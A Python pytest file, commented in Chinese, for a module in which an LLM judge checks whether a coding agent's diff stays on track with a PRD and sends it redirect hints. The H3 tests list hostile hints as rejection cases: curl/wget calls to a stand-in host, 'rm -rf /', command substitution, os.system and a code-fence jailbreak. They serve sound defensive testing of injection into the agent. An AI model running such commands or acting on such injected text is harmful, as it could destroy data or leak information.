#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""test_semantic_gate.py — 内循环方向抽查单测（TDD，in-loop-semantic-checkpoint §3-§6）。

覆盖零依赖模块 semantic_gate.py（dev-agent 带连字符不可 import，方向抽查的可测逻辑全在此）：
    T1  judge_direction fail-open（subproc raise→None 不抛 / 正常返回 payload+meta）
    T2  truncate_diff 截断 / collect_diff git 失败安全占位
    T3  build_progress_prompt（PRD+diff+JSON 契约）/ build_redirect_prompt（追加纠偏）
    T4  run_checkpoint on_track 重置 off_track_count、action=continue
    T5  run_checkpoint 首次 off_track 设 redirect_pending、action=redirect
    T6  run_checkpoint 二次 off_track 设 off_track_exhausted、action=exhausted
    T10 run_checkpoint 成本熔断 skip（不调评判）
    T7  decide_after_leg off_track_exhausted → terminal=exhausted（main exit 15）
    T8  decide_after_leg 首次 redirect → resume_redirect=True（main resume 重发）

跑：python3 -m pytest scripts/test_semantic_gate.py -q
AAA 结构（Arrange / Act / Assert）。
"""
from __future__ import annotations

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent))
import semantic_gate as sg  # noqa: E402


def _state() -> dict:
    """create_loop_state 的 checkpoint 字段子集（run_checkpoint/decide_after_leg 消费）。"""
    return {"judge_k": sg.JUDGE_K, "judge_rounds": 0, "off_track_count": 0,
            "last_verdict": None, "last_covered": [], "redirect_pending": None,
            "off_track_exhausted": False, "judge_cost_acc": 0.0}


# ─── T1：judge_direction fail-open ───────────────────────────────────
def test_judge_direction_failopen_returns_none(monkeypatch):
    """subproc raise → None，不抛（fail-open：护栏故障绝不误杀 dev）。"""
    def boom(*a, **k):
        raise RuntimeError("subprocess boom")
    monkeypatch.setattr(sg, "run_persona_subproc", boom)
    got = sg.judge_direction("PRD", "DIFF", claude_bin="fake")   # 传 bin 跳过 resolve
    assert got is None


def test_judge_direction_returns_payload_and_meta(monkeypatch):
    monkeypatch.setattr(sg, "run_persona_subproc",
                        lambda *a, **k: ({"verdict": "off_track", "redirect_hint": "转 A1"},
                                         {"cost": 0.03, "session_id": "s1"}))
    payload, meta = sg.judge_direction("PRD", "DIFF", claude_bin="fake")
    assert payload["verdict"] == "off_track"
    assert meta["cost"] == 0.03


def test_judge_direction_no_claude_bin_failopen(monkeypatch):
    """找不到 claude CLI → None（不 sys.exit 杀进程）。"""
    monkeypatch.setattr(sg, "resolve_claude_bin_safe", lambda: "")

    def boom(*a, **k):   # 不应被调到
        raise AssertionError("不该调 run_persona_subproc")
    monkeypatch.setattr(sg, "run_persona_subproc", boom)
    assert sg.judge_direction("PRD", "DIFF") is None


# ─── T2：truncate_diff / collect_diff ────────────────────────────────
def test_truncate_diff_large():
    big = "x" * (sg.JUDGE_DIFF_MAX_CHARS + 500)
    out = sg.truncate_diff(big)
    assert "truncated" in out
    assert str(sg.JUDGE_DIFF_MAX_CHARS + 500) in out
    assert len(out) < len(big)


def test_truncate_diff_small_passthrough():
    assert sg.truncate_diff("small diff") == "small diff"


def test_collect_diff_truncates(monkeypatch):
    big = "y" * (sg.JUDGE_DIFF_MAX_CHARS + 10)
    assert "truncated" in sg.collect_diff(lambda args: big)


def test_collect_diff_git_failure_safe():
    def boom(args):
        raise RuntimeError("git boom")
    out = sg.collect_diff(boom)
    assert "git diff 失败" in out


# ─── T3：build_progress_prompt / build_redirect_prompt ───────────────
def test_build_progress_prompt_contains_prd_diff_and_contract():
    p = sg.build_progress_prompt("MY_PRD_TEXT", "MY_DIFF_TEXT")
    assert "MY_PRD_TEXT" in p
    assert "MY_DIFF_TEXT" in p
    assert "verdict" in p and "on_track" in p and "off_track" in p
    assert "redirect_hint" in p


def test_build_redirect_prompt_appends_hint_to_base():
    p = sg.build_redirect_prompt("BASE_PROMPT", "转向验收标准 A1")
    assert p.startswith("BASE_PROMPT")
    assert "转向验收标准 A1" in p
    assert "跑偏" in p or "off_track" in p or "纠偏" in p


# ─── T4/T5/T6/T10：run_checkpoint 状态机 ─────────────────────────────
def test_checkpoint_on_track_resets_and_continues():
    """T4：on_track 重置 off_track_count（即便之前 off 过）、action=continue、不 break。"""
    state = _state()
    state["off_track_count"] = 1                       # 假设上一轮 off 过
    judge_fn = lambda pt, db: ({"verdict": "on_track", "covered": ["A1"]}, {"cost": 0.01})  # noqa: E731
    action, record = sg.run_checkpoint(state, turn=10, prd_text="P", diff_bundle="D", judge_fn=judge_fn)
    assert action == "continue"
    assert state["off_track_count"] == 0               # 重置
    assert state["judge_rounds"] == 1
    assert state["judge_cost_acc"] == pytest.approx(0.01)
    assert record["verdict"] == "on_track"


def test_checkpoint_first_offtrack_redirects():
    """T5：首次 off_track → redirect_pending=redirect_hint、off_track_count=1、action=redirect。"""
    state = _state()
    judge_fn = lambda pt, db: ({"verdict": "off_track", "redirect_hint": "转 A1"}, {"cost": 0.02})  # noqa: E731
    action, record = sg.run_checkpoint(state, 10, "P", "D", judge_fn=judge_fn)
    assert action == "redirect"
    assert state["off_track_count"] == 1
    assert state["redirect_pending"] == "转 A1"
    assert state["off_track_exhausted"] is False


def test_checkpoint_second_offtrack_exhausted():
    """T6：二次 off_track → off_track_exhausted=True、action=exhausted。"""
    state = _state()
    state["off_track_count"] = 1                       # 已 off 过一次
    judge_fn = lambda pt, db: ({"verdict": "off_track", "redirect_hint": "再转"}, {"cost": 0.02})  # noqa: E731
    action, _ = sg.run_checkpoint(state, 10, "P", "D", judge_fn=judge_fn)
    assert action == "exhausted"
    assert state["off_track_exhausted"] is True
    assert state["off_track_count"] == 2


def test_checkpoint_cost_breaker_skips():
    """T10：累计成本 ≥ cap → 不调评判、action=none（fail-open 不阻断 dev）。"""
    state = _state()
    state["judge_cost_acc"] = sg.JUDGE_BUDGET_CAP + 0.1
    called = {"n": 0}

    def judge_fn(pt, db):
        called["n"] += 1
        return {"verdict": "on_track"}, {}
    action, record = sg.run_checkpoint(state, 10, "P", "D", judge_fn=judge_fn)
    assert action == "none"
    assert called["n"] == 0
    assert record["reason"] == "cost_breaker"


def test_checkpoint_non_k_boundary_skips():
    """非 K 边界 turn → 不调评判、无 record。"""
    state = _state()
    called = {"n": 0}

    def judge_fn(pt, db):
        called["n"] += 1
        return {"verdict": "on_track"}, {}
    action, record = sg.run_checkpoint(state, 7, "P", "D", judge_fn=judge_fn)
    assert action == "none"
    assert called["n"] == 0
    assert record is None


def test_checkpoint_failopen_continues_without_changing_state():
    """评判 fail-open（judge_fn→None）→ action=none、off_track_count 不变。"""
    state = _state()
    state["off_track_count"] = 0
    judge_fn = lambda pt, db: None  # noqa: E731
    action, record = sg.run_checkpoint(state, 10, "P", "D", judge_fn=judge_fn)
    assert action == "none"
    assert state["off_track_count"] == 0
    assert record["event"] == "judge_failopen"


# ─── T7/T8：decide_after_leg（main while 循环消费；M3 改 NamedTuple 属性访问）───
def test_decide_after_leg_exhausted():
    """T7：off_track_exhausted → terminal=exhausted（main exit 15）。"""
    state = {"off_track_exhausted": True, "redirect_pending": None}
    d = sg.decide_after_leg(state, redirects_done=1)
    assert d.terminal == "exhausted"
    assert d.resume_redirect is False


def test_decide_after_leg_first_redirect():
    """T8：首次 redirect（redirects_done=0 + redirect_pending）→ resume_redirect=True。"""
    state = {"off_track_exhausted": False, "redirect_pending": "转 A1"}
    d = sg.decide_after_leg(state, redirects_done=0)
    assert d.terminal is None
    assert d.resume_redirect is True
    assert d.next_redirects_done == 1


def test_decide_after_leg_no_more_redirect():
    """已用过 1 次纠偏（redirects_done=1）+ 无新 redirect_pending → 终止（进 stalled/gate/commit）。"""
    state = {"off_track_exhausted": False, "redirect_pending": None}
    d = sg.decide_after_leg(state, redirects_done=1)
    assert d.resume_redirect is False
    assert d.terminal is None


def test_decide_after_leg_exhausted_preempts_redirect():
    """exhausted 优先于 redirect（即便 redirect_pending 也在，先 exit 15）。"""
    state = {"off_track_exhausted": True, "redirect_pending": "something"}
    d = sg.decide_after_leg(state, redirects_done=0)
    assert d.terminal == "exhausted"


def test_leg_decision_is_namedtuple():
    """M3：decide_after_leg 返回 NamedTuple（isinstance tuple + 属性访问 + tuple 解包兼容）。"""
    d = sg.decide_after_leg({"off_track_exhausted": False, "redirect_pending": "h"}, 0)
    assert isinstance(d, tuple)              # NamedTuple 是 tuple（与既有 TestEvidence 同构）
    assert d.resume_redirect is True         # 属性访问（拼错 → loud AttributeError，非 silent None）
    terminal, resume, nrd = d                # tuple 解包兼容
    assert nrd == 1


# ─── H2：空/缺 hint fail-open 不污染 off_track_count ──────────────────
def test_checkpoint_empty_hint_failopen():
    """H2：off_track 但 redirect_hint 缺失 → action=none、off_track_count 不变、bad_hint 事件。"""
    state = _state()
    judge_fn = lambda pt, db: ({"verdict": "off_track"}, {"cost": 0.01})  # noqa: E731
    action, record = sg.run_checkpoint(state, 10, "P", "D", judge_fn=judge_fn)
    assert action == "none"
    assert state["off_track_count"] == 0      # 不污染（否则两阶段降级零阶段）
    assert state["redirect_pending"] is None
    assert record["event"] == "judge_failopen_bad_hint"


def test_checkpoint_blank_hint_failopen():
    """H2：redirect_hint 是空白串同样 fail-open。"""
    state = _state()
    judge_fn = lambda pt, db: ({"verdict": "off_track", "redirect_hint": "   "}, {"cost": 0.01})  # noqa: E731
    action, record = sg.run_checkpoint(state, 10, "P", "D", judge_fn=judge_fn)
    assert action == "none"
    assert state["off_track_count"] == 0
    assert record["event"] == "judge_failopen_bad_hint"


# ─── H3：非法 hint（越狱/命令/超长）fail-open ─────────────────────────
def test_checkpoint_malicious_hint_failopen():
    """H3：redirect_hint 含 shell 元字符/围栏/网络/代码执行串 → fail-open 不注入 dev、不污染计数。"""
    bad_hints = [
        "```bash\ncurl http://x",              # 围栏越狱 + 网络外传
        "run $(whoami)",                        # 命令替换
        "exec rm -rf /",                        # 命令执行
        "wget http://evil.tld",                 # 网络外传
        "import os; os.system('x')",            # Python 代码执行
        "a" * 600,                              # 超长
    ]
    for bad in bad_hints:
        state = _state()
        judge_fn = lambda pt, db, h=bad: ({"verdict": "off_track", "redirect_hint": h}, {"cost": 0.01})  # noqa: E731
        action, record = sg.run_checkpoint(state, 10, "P", "D", judge_fn=judge_fn)
        assert action == "none", f"非法 hint 应 fail-open: {bad!r}"
        assert state["off_track_count"] == 0, f"非法 hint 不应污染计数: {bad!r}"
        assert state["redirect_pending"] is None


def test_validate_redirect_hint_accepts_plain_guidance():
    """H3：合法的纯文本纠偏指引通过白名单。"""
    assert sg.validate_redirect_hint("转向验收标准 A1，先补单测再实现") is True
    assert sg.validate_redirect_hint("当前在重构无关模块，回到 PRD §3 的接口契约") is True


def test_validate_redirect_hint_rejects():
    """H3：空/None/超长/含禁用串被拒。"""
    assert sg.validate_redirect_hint("") is False
    assert sg.validate_redirect_hint(None) is False
    assert sg.validate_redirect_hint("a" * 600) is False
    assert sg.validate_redirect_hint("curl http://x") is False
    assert sg.validate_redirect_hint("run `whoami`") is False
    assert sg.validate_redirect_hint("```\ncode\n```") is False
    assert sg.validate_redirect_hint("base64 -d payload") is False


# ─── M5：record 与 state 同步（变更后捕获）──────────────────────────
def test_checkpoint_record_count_synced_exhausted():
    """M5：exhausted 时 record.off_track_count == state == 2（变更后，旧行为错捕旧值 1）。"""
    state = _state()
    state["off_track_count"] = 1
    judge_fn = lambda pt, db: ({"verdict": "off_track", "redirect_hint": "再转向 A2"}, {"cost": 0.02})  # noqa: E731
    action, record = sg.run_checkpoint(state, 10, "P", "D", judge_fn=judge_fn)
    assert action == "exhausted"
    assert state["off_track_count"] == 2
    assert record["off_track_count"] == 2     # M5：与 state 同步
    assert record["exhausted"] is True


def test_checkpoint_record_count_synced_on_track():
    """M5：on_track 时 record.off_track_count == 0（重置后捕获，旧行为错捕旧值）。"""
    state = _state()
    state["off_track_count"] = 1              # 之前 off 过
    judge_fn = lambda pt, db: ({"verdict": "on_track", "covered": ["A1"]}, {"cost": 0.01})  # noqa: E731
    _, record = sg.run_checkpoint(state, 10, "P", "D", judge_fn=judge_fn)
    assert record["off_track_count"] == 0     # 重置后


# ─── H3：build_progress_prompt 围栏加固 ──────────────────────────────
def test_build_progress_prompt_defangs_backticks():
    """H3：diff/PRD 里的 3+ 反引号被转义（'''），防闭合 4 反引号围栏（code-fence 越狱）。"""
    p = sg.build_progress_prompt("PRD with ``` inside", "diff with `````` inside")
    assert "````" in p                         # 4 反引号围栏仍在
    assert "'''" in p                          # 内容反引号被 defang


def test_build_redirect_prompt_marks_hint_as_reference():
    """H3：redirect_hint 以引用前缀（> ）标注为参考文本，并提示工作树自恢复（H1 新 session 现实）。"""
    p = sg.build_redirect_prompt("BASE", "转向验收标准 A1")
    assert "BASE" in p
    assert "> 转向验收标准 A1" in p            # 引用前缀
    assert "git diff" in p                      # worktree 自恢复提示
